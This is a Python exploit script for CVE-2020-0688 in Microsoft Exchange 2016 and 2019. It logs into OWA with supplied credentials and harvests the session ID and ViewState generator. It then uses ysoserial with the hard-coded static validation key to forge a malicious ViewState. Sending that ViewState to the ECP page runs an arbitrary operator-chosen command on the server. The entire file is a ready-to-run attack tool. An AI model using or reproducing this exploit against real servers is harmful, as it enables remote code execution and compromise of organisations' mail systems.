import requests
import requests.packages.urllib3
import re
import urllib
import subprocess
import argparse
import sys
requests.packages.urllib3.disable_warnings()

s = requests.Session()
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

def getKey(username, password, server):

    data={
    'destination': 'https://{0}/ecp/default.aspx'.format(server),
    'flags': '4',
    'forcedownlevel': 0,
    'username': '{0}'.format(username),
    'password': '{0}'.format(password),
    'passwordText': '',
    'isUtf8':'1',
    'trusted': '4'
    }

    max_tries = 3 
    i = 0


    while i <= max_tries:
        try:
            r = s.post('https://{0}/owa/auth.owa'.format(server), data=data, headers=headers, verify=False)
            if 'ASP.auth_logon_aspx' not in r.text:
                print('[+]Login success')
                asp_SessionId = r.cookies['ASP.NET_SessionId']
                vsg = re.search('id="__VIEWSTATEGENERATOR" value="(.+?)"', r.text)[1]
                print('[+]__VIEWSTATEGENERATOR: {0}'.format(vsg))
                print('[+]ASP.NET_SessionId: {0}'.format(asp_SessionId))
                return asp_SessionId, vsg
            else:
                print('Login Failed')
                exit()
        except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout, requests.exceptions.Timeout) as e:
            print('[-]Network error, will try {0} times'.format(max_tries - i))
        except TypeError:
            print('[-]Could not find __VIEWSTATEGENERATOR, maybe is\'s not vuln')
            exit()
        finally:
            i += 1
    if i > 3:
        print('[-]Could not connect to the target, Please check your network')
        exit()

def attack(username, password, server, command):
    vsuk, vsg = getKey(username, password, server)
    command = 'Release\\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "{0}" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="{1}" --viewstateuserkey="{2}" --isdebug -islegacy'.format(command, vsg, vsuk)
    #print(command)
    p = subprocess.Popen(command, stdout = subprocess.PIPE, stdin = subprocess.PIPE)
    outinfo, errinfo = p.communicate()
    outinfo = outinfo.decode('utf-8').split('\r\n')[4]
    url = 'https://' + server + '/ecp/default.aspx?__VIEWSTATEGENERATOR={0}&__VIEWSTATE={1}'.format(vsg, urllib.parse.quote(outinfo))
    r = s.get(url, headers=headers, verify=False)
    if r.status_code == 500:
        print('[+]attack success')
    else:
        print('[-]status_code is not 500, may be it\'s not vuln')






if __name__ == '__main__':
    description = '''
    CVE-2020-0688 exp\r\n
    work for Exchage2016 and Exchange 2019(Exchange 2013 do not have __VIEWSTATEGENERATOR)\r\n
    Example:python3 {0} -s 127.0.0.1 -u lab\\administrator -p xxx -c cmd.exe /c calc.exe\r\n
    '''.format(sys.argv[0])
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('-s', metavar='server IP or Domain', help='Only need Ip or Domain', required=True)
    parser.add_argument('-u', metavar='username', help='example:lab\\administrator', required=True)
    parser.add_argument('-p', metavar='password', help='Domain user\'s Password',required=True )
    parser.add_argument('-c', metavar='command', help='Execute command', required=True)
    args = parser.parse_args()
    server = args.s
    username = args.u
    password = args.p
    command = args.c
    attack(username, password, server, command)
